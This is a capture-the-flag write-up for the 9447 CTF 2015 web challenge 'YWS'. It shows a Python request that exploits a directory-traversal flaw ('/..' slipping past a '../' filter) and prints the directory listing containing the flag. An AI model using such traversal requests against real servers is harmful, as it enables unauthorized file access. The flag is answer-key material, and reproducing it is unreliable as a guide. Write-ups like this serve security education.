# 9447 CTF 2015: YWS

**Category:** Web
**Points:** 130
**Solves:** 197
**Description:**

> My friend wrote a cool web server. I'm sure he's stored some great doxxxs on the website. Can you take a look and report back any interesting things you find?
> 
> The web page is at <http://yws-fsiqc922.9447.plumbing>
> 
> Hint! Where does the website *not* want you to go?


## Write-up

by [f0rki](https://github.com/f0rki)

We poked around a lot at this challenge. Tried several different inputs and URLs. Only
later we realized that we could have looked at the binary of [BWS](/9447-ctf-2015/exploitation/bws)
We realized that there was something funky going on regarding the filtering of the
paths. So after poking around a little bit, I found that the following works:
```
import requests as r
print(r.get("http://yws-fsiqc922.9447.plumbing/..").content)
```
And we got back the directory listing contains the flag.
```
<html>
<head>
<title>Directory listing for /..</title>
</head>
<body>
<h2>Directory listing for /..</h2>
<hr>
<ul>
<li><a href="/../.">.</a>
<li><a href="/../..">..</a>
[...]
<li><a href="/../9447{D1rect0ries_ARe_h4rd}">9447{D1rect0ries_ARe_h4rd}</a>
[...]
</ul>
<hr>
</body>
</html>
```

Apparently the webserver filtered out `../` but not `..`. We had troubles 
using the browser or curl to fetch this. Probably because they automatically 
append a `/` character or something like that.

## Other write-ups and resources

* <http://blog.jclariviere.com/posts/ctf-writeup-9447-ctf-2015-yws/>
* <https://asciinema.org/a/30881>
* <http://pastebin.com/jzd6DVMu>
* <https://gist.github.com/Invizory/7772c252b35c1bc95e6b>
* [sophia.re](http://www.sophia.re/yws.mdown.html)
